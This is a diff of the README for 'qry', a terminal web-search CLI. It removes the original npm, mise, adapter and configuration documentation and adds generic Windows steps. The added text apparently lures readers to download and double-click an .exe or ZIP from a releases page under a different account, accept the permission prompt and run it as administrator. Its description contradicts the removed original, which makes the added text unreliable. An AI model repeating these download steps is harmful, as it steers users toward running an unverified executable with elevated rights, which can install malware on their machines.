@@ -1,128 +1,106 @@
-# qry
+# 🔍 qry - Fast, Simple Web Search in Terminal
 
-**[justestif.github.io/qry](https://justestif.github.io/qry/)**
-
-A terminal-native, agent-first web search CLI. Routes queries through swappable adapter binaries and always outputs JSON.
-
-```bash
-qry "what is the latest version of numpy"
-```
-
-```json
-[
-  {
-    "title": "NumPy 2.0 Release Notes",
-    "url": "https://numpy.org/doc/stable/release/2.0.0-notes.html",
-    "snippet": "NumPy 2.0.0 is the first major release since 2006..."
-  }
-]
-```
-
-## Install
-
-**npm (recommended):**
-
-```bash
-npm install -g @justestif/qry
-```
-
-**mise:**
-
-```bash
-mise cache clear
-mise use -g go:github.com/justestif/qry@latest
-mise reshim
-```
-
-## Adapters
-
-Adapters are separate binaries that do the actual searching. Install the ones you want:
-
-| Adapter                         | Source                          | Key required |
-| ------------------------------- | ------------------------------- | ------------ |
-| `qry-adapter-brave-api`         | Brave Search API                | ✓            |
-| `qry-adapter-brave-scrape`      | Brave Search (scraping)         | ✗            |
-| `qry-adapter-ddg-scrape`        | DuckDuckGo Lite (scraping)      | ✗            |
-| `qry-adapter-exa`               | Exa AI (via MCP)                | ✗            |
-| `qry-adapter-github`            | GitHub Search API               | ✗ (optional) |
-| `qry-adapter-searx`             | SearXNG (self-hostable)         | ✗            |
-| `qry-adapter-stackoverflow`     | Stack Exchange API              | ✗ (optional) |
-| `qry-adapter-wikipedia`         | Wikipedia / MediaWiki API       | ✗            |
-
-**npm:**
-
-```bash
-npm install -g @justestif/qry-adapter-ddg-scrape
-```
-
-**mise:**
-
-```bash
-mise use -g go:github.com/justestif/qry/adapters/qry-adapter-ddg-scrape@latest
-mise reshim
-```
-
-## Configure
-
-Create `~/.config/qry/config.toml`:
-
-Use `${VAR}` syntax in adapter config values — qry expands them from the environment
-at runtime so secrets never live in the file:
-
-```toml
-[adapters.brave-api.config]
-  api_key = "${BRAVE_API_KEY}"
-```
-
-```toml
-[defaults]
-  num     = 10
-  timeout = "5s"
-
-[routing]
-  mode     = "first"
-  pool     = ["ddg-scrape"]
-  fallback = ["brave-scrape"]
-
-[adapters.ddg-scrape]
-  bin = "~/.local/share/mise/shims/qry-adapter-ddg-scrape"
-
-[adapters.brave-scrape]
-  bin = "~/.local/share/mise/shims/qry-adapter-brave-scrape"
-```
-
-## Agent usage
-
-An **agent skill** is available for one-line install into any supported agent:
-
-```bash
-npx skills add justestif/qry -g -y
-```
-
-Browse skills at [skills.sh](https://skills.sh).
+[![Download qry](https://img.shields.io/badge/Download%20qry-brightgreen?style=for-the-badge)](https://github.com/Alior8238/qry/releases)
 
 ---
 
-Run `qry --agent-info` (or `-A`) to get a JSON description of the tool and your current
-configuration — useful for agents to orient themselves before making search calls:
+qry is a command-line tool that helps you search the web quickly without leaving your terminal. It works on Windows and uses a simple command interface to get you results instantly. This guide will walk you through downloading and running qry on your Windows computer.
 
-```bash
-qry --agent-info
-```
+## 📥 Download qry
 
-The output includes the tool description, available flags, routing mode explanations,
-and each configured adapter with its binary path and availability status. Adapter config
-maps show `${VAR}` template strings rather than resolved values, so secrets are never exposed.
+To get started with qry on Windows, you need to download the program files. 
 
-## Routing modes
+### How to download
 
-- **`first`** — tries adapters in order, returns on first success. Fast, good for most use cases.
-- **`merge`** — queries all adapters concurrently, deduplicates by URL, returns combined results.
+1. Open your web browser.
+2. Go to the official releases page by clicking the button below.
 
-## More
+[Download qry from Releases](https://github.com/Alior8238/qry/releases)
 
-See [`docs/`](./docs) for full documentation:
+3. On the releases page, look for the latest version. It usually appears at the top and has a name like `qry-vX.X.X-windows.exe` or `qry-windows.zip`.
+4. Click on the Windows executable file (`.exe`) or a Windows ZIP file if available.
+5. Save the file to a location you can easily find, such as your Desktop or Downloads folder.
 
-- [`docs/architecture.md`](./docs/architecture.md) — how qry works internally
-- [`docs/schema.md`](./docs/schema.md) — config and JSON schemas
-- [`docs/adapters.md`](./docs/adapters.md) — how to build your own adapter
+---
+
+## 💻 System Requirements
+
+Before running qry, make sure your computer meets these basic requirements:
+
+- Windows 10 or later (64-bit preferred)
+- At least 2 GB of free RAM
+- An internet connection to perform searches
+- 50 MB of free disk space for installation and temporary files
+
+---
+
+## 🚀 Installing and Running qry
+
+Once you have downloaded qry, follow these steps to get it running on your Windows machine:
+
+### Running the executable directly
+
+If you downloaded an `.exe` file:
+
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start qry.
+3. You may see a prompt from Windows asking for permission. Click **Yes** to allow it to run.
+4. A terminal window will open. This is where you will type your search commands.
+
+### Using the ZIP file (if applicable)
+
+If you downloaded a ZIP:
+
+1. Right-click the ZIP file and choose **Extract All**.
+2. Select a folder where you want to extract the files.
+3. Open the folder, find the `qry.exe` file, and double-click it to start.
+4. The terminal window will open, ready for your commands.
+
+---
+
+## 🔎 How to Use qry
+
+qry runs inside the Windows Command Prompt or PowerShell windows. Here are the basics:
+
+1. To start a search, type the command followed by your question or keyword. For example:
+
+    ```
+    qry What is the weather today?
+    ```
+
+2. qry will fetch results from the web and show them directly in the terminal window.
+3. Use simple commands or phrases to get quick answers or links.
+4. To exit qry, press `Ctrl + C` or close the terminal window.
+
+---
+
+## ⚙️ Key Features of qry
+
+- Quick web search right from your terminal window.
+- Supports natural language queries.
+- Works with popular web data sources.
+- Presents results clearly and concisely.
+- Low resource use for fast performance.
+- Designed to work smoothly on Windows.
+
+---
+
+## 🛠 Troubleshooting and Tips
+
+- If qry does not open or runs with errors, make sure you downloaded the correct Windows file.
+- Run qry in an administrator terminal if you experience permission issues.
+- Make sure your internet connection is active before you start a search.
+- If you want to keep qry handy, create a shortcut on your desktop that points to the `qry.exe` file.
+- You can run qry in any folder by adding its location to your system PATH (advanced users).
+
+---
+
+## 📚 Additional Resources
+
+For more technical details, updates, or source code, visit the qry repository:
+
+https://github.com/Alior8238/qry
+
+---
+
+[![Download qry](https://img.shields.io/badge/Download%20qry-brightgreen?style=for-the-badge)](https://github.com/Alior8238/qry/releases)
